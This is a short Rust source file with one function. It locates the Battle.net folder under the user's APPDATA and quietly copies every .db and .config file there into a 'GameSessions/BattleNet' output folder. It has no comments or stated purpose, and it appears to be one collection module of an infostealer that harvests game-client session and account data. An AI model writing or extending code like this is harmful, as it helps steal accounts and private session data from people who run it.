use std::path::{Path, PathBuf};
use std::fs;

pub fn extract(output_dir: &Path) -> usize {
    let mut count = 0;
    
    let app_data = match std::env::var("APPDATA") {
        Ok(p) => PathBuf::from(p),
        Err(_) => return 0,
    };

    let bnet_path = app_data.join("Battle.net");
    if !bnet_path.exists() {
        return 0;
    }

    let dest_dir = output_dir.join("GameSessions").join("BattleNet");
    let mut created_dir = false;

    if let Ok(entries) = fs::read_dir(&bnet_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                    if ext == "db" || ext == "config" {
                        if !created_dir {
                            fs::create_dir_all(&dest_dir).ok();
                            created_dir = true;
                        }
                        if let Some(fname) = path.file_name() {
                            if let Ok(_) = fs::copy(&path, dest_dir.join(fname)) {
                                count += 1;
                            }
                        }
                    }
                }
            }
        }
    }

    count
}
